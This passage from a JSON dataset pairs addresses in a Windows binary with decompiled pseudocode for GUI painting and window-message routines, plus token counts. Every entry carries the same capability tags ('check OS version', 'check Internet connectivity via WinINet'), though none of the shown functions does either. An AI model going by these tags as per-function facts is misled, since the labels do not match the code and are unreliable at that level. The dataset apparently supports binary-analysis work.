        "decompiled_code": "\nvoid __fastcall fcn.00455c14(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x1b4) == 0) {\n        fcn.00451ef8();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.00451b4c(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.00424230();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.00424fb0();\n            uVar2 = fcn.00424230();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00424fec();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x499c7c) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x1a8), *(in_EAX + 0x1b4), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.00450430(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "00455d50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455d50(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.00455d50::var_50h;\n        uStack104 = 0x455d7a;\n        uStack104 = fcn.004585f8();\n        puStack108 = 0x455d80;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x455eaf;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x455dab;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x455e86;\n        fcn.00455ee8();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x455eb6;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.00455d50::var_50h;\n            iStack116 = 0x455ea8;\n            iStack116 = fcn.004585f8();\n            iStack120 = 0x455eae;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x455db9;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x455e72;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.00419898();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x455e79;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 943
    },
    "00455ee8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455ee8(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.004198f4();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.00419898();\n                if (((*(var_18h + 0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.00418448(&fcn.00455ee8::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x456005;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x456028;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x456095;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.0044eea0();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.00451b4c(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x45609c);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.00419898();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((((*(iVar2 + 0x1c) & 0x10) == 0 && (*(iVar2 + 0x57) != '\\0')) ||\n                ((((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)) && ((*(iVar2 + 0x55) & 8) == 0)))))) {\n                fcn.00424230();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x45615e;\n                fcn.00418448(&fcn.00455ee8::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.00455ee8::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x45616b;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x456171;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x45617b;\n                uStack88 = fcn.00424230();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.00455ee8::lprc;\n                uVar4 = uVar3;\n                fcn.00418448(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.00455ee8::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1396
    },
    "00456278": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456278(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x45629a;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x4564b1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044eea0();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar5 = 0;\n    iVar4 = 0;\n    uVar2 = fcn.004585f8(0xffffffec);\n    uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n    if ((uVar3 & 0x200) == 0) {\n        uVar2 = fcn.004585f8(0xfffffff0);\n        uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n        if ((uVar3 & 0x800000) != 0) {\n            iVar4 = 3;\n            iVar5 = 0xa00f;\n        }\n    }\n    else {\n        iVar4 = 10;\n        iVar5 = 0x200f;\n    }\n    if (iVar4 == 10) {\n        fcn.00432228();\n        cVar1 = fcn.00432330();\n        if ((cVar1 != '\\0') && (((*(var_4h + 0x1c) & 0x10) == 0 || (cVar1 = fcn.004321d0(),  cVar1 == '\\0')))) {\n            sub.user32.dll_SetRect(&fcn.00456278::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n            if ((*(var_4h + 0x52) & 2) == 0) {\n                *(var_4h + 0x50) = *(var_4h + 0x50) | *0x4564cc;\n                fcn.004561c8();\n                *(var_4h + 0x50) = ~*0x4564cc & *(var_4h + 0x50);\n            }\n            else {\n                fcn.004561c8();\n            }\n            fcn.0044eea0();\n            sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n            goto code_r0x00456431;\n        }\n    }\n    if (iVar5 != 0) {\n        sub.user32.dll_SetRect(&fcn.00456278::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.00456278::lprc, iVar4, iVar5);\n        fcn.0044eea0();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\ncode_r0x00456431:\n    fcn.00451b4c(0);\n    uVar2 = 0;\n    fcn.00451b4c(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar5 = fcn.00419898();\n            if (*(iVar5 + 0x57) != '\\0') {\n                uVar2 = *(iVar5 + 0x44);\n                fcn.00456278(uVar2);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x4564b8);\n    return;\n}\n",
        "token_count": 1122
    },
    "00456894": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456894(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.00432228();\n    cVar1 = fcn.00432330();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x90) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00424fec();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else if (*(in_EAX[0xc] + 0x240) == '\\0') {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.004585f8();\n        fcn.00432430(uVar2, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0044d5ec();\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 326
    },
    "00456e64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e64(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00418438();\n    iVar1 = fcn.00451b4c(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00456eb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456eb4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00456fe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456fe4(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.004585f8();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00457040": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00457040(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00456fac();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.00419898();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 143
    },
    "00457120": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457120(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4571c8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0044e1a0();\n        if (param_2 == '\\0') {\n            fcn.00404650();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.0040700c();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00404620();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.0040484c();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4571cf;\n    uStack28 = 0x4571c7;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 352
    },
    "004571d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004571d8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.004571d8::var_18h;\n        uStack52 = 0x457212;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.004585f8();\n        uStack56 = 0;\n        puStack60 = 0x45721a;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x457222;\n        fcn.00454204();\n        uStack64 = 0x45729b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.0040484c();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x4572a2;\n        uStack64 = 0x45729a;\n        fcn.0045420c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "004572c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004572c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1db) != '\\0') && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004572f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004572f0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x457305;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x45730f;\n    iVar3 = fcn.00404528();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x45735b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x45736c;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x45735a;\n            fcn.00450af8();\n        }\n        return;\n    }\n    puStack24 = 0x45736c;\n    fcn.00452dac();\n    return;\n}\n",
        "token_count": 290
    },
    "004573a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004573a0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    int32_t iStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd90();\n    if ((iVar3 != 0) && (in_EAX != iVar3)) {\n        if (*(iVar3 + 0x275) != '\\0') {\n            cVar1 = fcn.004573a0();\n            if (cVar1 != '\\0') goto code_r0x0045743e;\n        }\n        if (*(iVar3 + 0x30) != 0) {\n            iStack20 = fcn.0043bd90();\n            if (((iStack20 != 0) && (iVar3 != iStack20)) && (*(iStack20 + 0x275) != '\\0')) {\n                cVar1 = fcn.004573a0();\n                if (cVar1 != '\\0') goto code_r0x0045743e;\n            }\n        }\n    }\n    uVar2 = fcn.0043bc50();\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c(uVar2);\n        if (*(param_2 + 4) == 0) goto code_r0x0045743e;\n    }\n    uVar4 = 0;\ncode_r0x0045743e:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 381
    },
    "004574cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004574cc(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd90();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar1 = fcn.004574cc();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x0045752c;\n    }\n    uVar2 = fcn.0043bc50();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c();\n        if (*(param_2 + 4) == 0) goto code_r0x0045752c;\n    }\n    uVar4 = 0;\ncode_r0x0045752c:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 302
    },
    "00457594": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00457594(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd90();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar2 = fcn.00457594();\n        if (cVar2 != '\\0') goto code_r0x004575f2;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.0040484c();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x004575f2;\n    }\n    uVar4 = 0;\ncode_r0x004575f2:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 316
    },
    "004577ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004577ec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x19] == 0) {\n        iVar1 = fcn.00450804();\n        if (iVar1 < 1) {\n            iVar1 = fcn.0040aadc();\n            in_EAX[0x19] = iVar1;\n        }\n        else {\n            iVar1 = fcn.0040aabc();\n            in_EAX[0x19] = iVar1;\n            fcn.0040aad0();\n            fcn.00450814();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    fcn.00459930();\n    return;\n}\n",
        "token_count": 166
    },
    "0045786c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045786c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 105
    },
    "00457890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00457890(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0044f900();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.004546e8();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.004546ac();\n                uVar1 = fcn.0040484c();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 218
    },
    "00457944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457944(uint param_1, int32_t param_2)\n\n{\n    fcn.00452b64();\n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.00454ff0();\n    }\n    fcn.00454778();\n    return;\n}\n",
        "token_count": 87
    },
    "00457a5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
